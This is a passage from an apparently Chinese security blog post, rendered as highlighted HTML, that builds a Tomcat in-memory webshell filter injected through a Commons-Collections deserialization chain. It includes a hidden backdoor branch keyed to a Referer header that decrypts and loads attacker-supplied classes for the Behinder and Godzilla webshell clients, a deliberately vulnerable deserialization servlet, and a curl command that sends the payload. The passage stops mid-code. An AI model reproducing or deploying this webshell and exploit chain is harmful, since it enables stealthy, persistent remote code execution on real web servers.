&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">HttpSession&lt;/span> &lt;span style="color:#111">session&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">request&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">getSession&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e">// create pageContext
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#111">HashMap&lt;/span> &lt;span style="color:#111">pageContext&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">HashMap&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">pageContext&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">put&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;request&amp;#34;&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">request&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">pageContext&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">put&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;response&amp;#34;&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">response&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">pageContext&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">put&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;session&amp;#34;&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">session&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">if&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">request&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">getMethod&lt;/span>&lt;span style="color:#f92672">().&lt;/span>&lt;span style="color:#75af00">equals&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;POST&amp;#34;&lt;/span>&lt;span style="color:#f92672">)){&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e">// 这里的判断条件可自行修改
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#00a8c8">if&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">request&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">getHeader&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;Referer&amp;#34;&lt;/span>&lt;span style="color:#f92672">).&lt;/span>&lt;span style="color:#75af00">equalsIgnoreCase&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;https://www.baidu.com/&amp;#34;&lt;/span>&lt;span style="color:#f92672">)){&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">try&lt;/span>&lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">String&lt;/span> &lt;span style="color:#111">k&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#34;e45e329feb5d925b&amp;#34;&lt;/span>&lt;span style="color:#f92672">;&lt;/span> &lt;span style="color:#75715e">// default: pass=beyond, k=md5(pass)[:16]
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#111">session&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">putValue&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;u&amp;#34;&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">k&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">Cipher&lt;/span> &lt;span style="color:#111">c&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">Cipher&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">getInstance&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;AES&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">c&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">init&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#ae81ff">2&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">SecretKeySpec&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">k&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">getBytes&lt;/span>&lt;span style="color:#f92672">(),&lt;/span> &lt;span style="color:#d88200">&amp;#34;AES&amp;#34;&lt;/span>&lt;span style="color:#f92672">));&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">Method&lt;/span> &lt;span style="color:#111">method&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">Class&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">forName&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;java.lang.ClassLoader&amp;#34;&lt;/span>&lt;span style="color:#f92672">).&lt;/span>&lt;span style="color:#75af00">getDeclaredMethod&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;defineClass&amp;#34;&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#00a8c8">byte&lt;/span>&lt;span style="color:#f92672">[].&lt;/span>&lt;span style="color:#75af00">class&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#00a8c8">int&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">class&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#00a8c8">int&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">class&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">method&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">setAccessible&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#00a8c8">true&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">byte&lt;/span>&lt;span style="color:#f92672">[]&lt;/span> &lt;span style="color:#111">evilclass_byte&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">c&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">doFinal&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">sun&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">misc&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">BASE64Decoder&lt;/span>&lt;span style="color:#f92672">().&lt;/span>&lt;span style="color:#75af00">decodeBuffer&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">request&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">getReader&lt;/span>&lt;span style="color:#f92672">().&lt;/span>&lt;span style="color:#75af00">readLine&lt;/span>&lt;span style="color:#f92672">()));&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">Class&lt;/span> &lt;span style="color:#111">evilclass&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">Class&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#111">method&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">invoke&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#00a8c8">this&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">getClass&lt;/span>&lt;span style="color:#f92672">().&lt;/span>&lt;span style="color:#75af00">getClassLoader&lt;/span>&lt;span style="color:#f92672">(),&lt;/span> &lt;span style="color:#111">evilclass_byte&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">evilclass_byte&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">length&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">evilclass&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">newInstance&lt;/span>&lt;span style="color:#f92672">().&lt;/span>&lt;span style="color:#75af00">equals&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">pageContext&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">return&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>&lt;span style="color:#00a8c8">catch&lt;/span> &lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">Exception&lt;/span> &lt;span style="color:#111">e&lt;/span>&lt;span style="color:#f92672">){&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e">// e.printStackTrace();
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>写一个反序列化接口来测试一下效果&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">javax.servlet.ServletException&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">javax.servlet.annotation.WebServlet&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">javax.servlet.http.HttpServlet&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">javax.servlet.http.HttpServletRequest&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">javax.servlet.http.HttpServletResponse&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">java.io.*&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75af00">@WebServlet&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;/cc&amp;#34;&lt;/span>&lt;span style="color:#f92672">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">CCServlet&lt;/span> &lt;span style="color:#00a8c8">extends&lt;/span> &lt;span style="color:#111">HttpServlet&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">@Override&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">protected&lt;/span> &lt;span style="color:#00a8c8">void&lt;/span> &lt;span style="color:#75af00">doGet&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">HttpServletRequest&lt;/span> &lt;span style="color:#111">req&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">HttpServletResponse&lt;/span> &lt;span style="color:#111">resp&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#00a8c8">throws&lt;/span> &lt;span style="color:#111">ServletException&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">IOException&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">InputStream&lt;/span> &lt;span style="color:#111">inputStream&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">InputStream&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#111">req&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">ObjectInputStream&lt;/span> &lt;span style="color:#111">objectInputStream&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">ObjectInputStream&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">inputStream&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">try&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">objectInputStream&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">readObject&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span> &lt;span style="color:#00a8c8">catch&lt;/span> &lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">ClassNotFoundException&lt;/span> &lt;span style="color:#111">e&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">e&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">printStackTrace&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">resp&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">getWriter&lt;/span>&lt;span style="color:#f92672">().&lt;/span>&lt;span style="color:#75af00">write&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;Success&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">@Override&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">protected&lt;/span> &lt;span style="color:#00a8c8">void&lt;/span> &lt;span style="color:#75af00">doPost&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">HttpServletRequest&lt;/span> &lt;span style="color:#111">req&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">HttpServletResponse&lt;/span> &lt;span style="color:#111">resp&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#00a8c8">throws&lt;/span> &lt;span style="color:#111">ServletException&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">IOException&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">InputStream&lt;/span> &lt;span style="color:#111">inputStream&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">req&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">getInputStream&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">ObjectInputStream&lt;/span> &lt;span style="color:#111">objectInputStream&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">ObjectInputStream&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">inputStream&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">try&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">objectInputStream&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">readObject&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span> &lt;span style="color:#00a8c8">catch&lt;/span> &lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">ClassNotFoundException&lt;/span> &lt;span style="color:#111">e&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">e&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">printStackTrace&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">resp&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">getWriter&lt;/span>&lt;span style="color:#f92672">().&lt;/span>&lt;span style="color:#75af00">write&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;Success&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>先编译TomcatInject.java，再运行CC11Template，生成的ser文件就是最终payload&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"># 虽然我把三梦师傅的TomcatEcho和TomcatInject和在一起了 但注意数据包仍然需要发送两次&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>curl &lt;span style="color:#d88200">&amp;#34;http://127.0.0.1:8088/cc&amp;#34;&lt;/span> --data-binary &lt;span style="color:#d88200">&amp;#34;@./cc11Test4.ser&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20220602204040825.png" alt="image-20220602204040825">&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20220602204148346.png" alt="image-20220602204148346">&lt;/p>
&lt;h3 id="接入哥斯拉">接入哥斯拉&lt;/h3>
&lt;p>哥斯拉的流量比冰蝎的简单多了，加密内容在参数pass中 以post方式发出，详细分析参见Y4er师傅的&lt;a href="https://y4er.com/post/solve-the-problem-of-godzilla-memory-shell-pagecontext/">解决哥斯拉内存马pagecontext的问题&lt;/a>&lt;/p>
&lt;p>继续融入我们原本的filter，代码如下&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">// omit
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>&lt;span style="color:#00a8c8">else&lt;/span> &lt;span style="color:#00a8c8">if&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">request&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">getHeader&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;Referer&amp;#34;&lt;/span>&lt;span style="color:#f92672">).&lt;/span>&lt;span style="color:#75af00">equalsIgnoreCase&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;https://www.sohu.com/&amp;#34;&lt;/span>&lt;span style="color:#f92672">)){&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">try&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e">// default: pass=pass, key=key, xc=md5(key)[:16]
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#111">String&lt;/span> &lt;span style="color:#111">pass&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#34;pass&amp;#34;&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">String&lt;/span> &lt;span style="color:#111">xc&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#34;3c6e0b8a9c15224a&amp;#34;&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">String&lt;/span> &lt;span style="color:#111">md5&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">md5&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">pass&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#111">xc&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">System&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">out&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">println&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;here&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">byte&lt;/span>&lt;span style="color:#f92672">[]&lt;/span> &lt;span style="color:#111">data&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">base64Decode&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">request&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">getParameter&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">pass&lt;/span>&lt;span style="color:#f92672">));&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">data&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">x&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">data&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#00a8c8">false&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">xc&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">if&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#00a8c8">this&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">payload&lt;/span> &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#00a8c8">null&lt;/span>&lt;span style="color:#f92672">){&lt;/span> &lt;span style="color:#75715e">// 在类中提前声明 `Class payload;`
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#111">URLClassLoader&lt;/span> &lt;span style="color:#111">urlClassLoader&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">URLClassLoader&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">URL&lt;/span>&lt;span style="color:#f92672">[&lt;/span>&lt;span style="color:#ae81ff">0&lt;/span>&lt;span style="color:#f92672">],&lt;/span> &lt;span style="color:#111">Thread&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">currentThread&lt;/span>&lt;span style="color:#f92672">().&lt;/span>&lt;span style="color:#75af00">getContextClassLoader&lt;/span>&lt;span style="color:#f92672">());&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">Method&lt;/span> &lt;span style="color:#111">defMethod&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">ClassLoader&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">class&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">getDeclaredMethod&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;defineClass&amp;#34;&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#00a8c8">byte&lt;/span>&lt;span style="color:#f92672">[].&lt;/span>&lt;span style="color:#75af00">class&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">Integer&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">TYPE&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">Integer&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">TYPE&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">defMethod&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">setAccessible&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#00a8c8">true&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
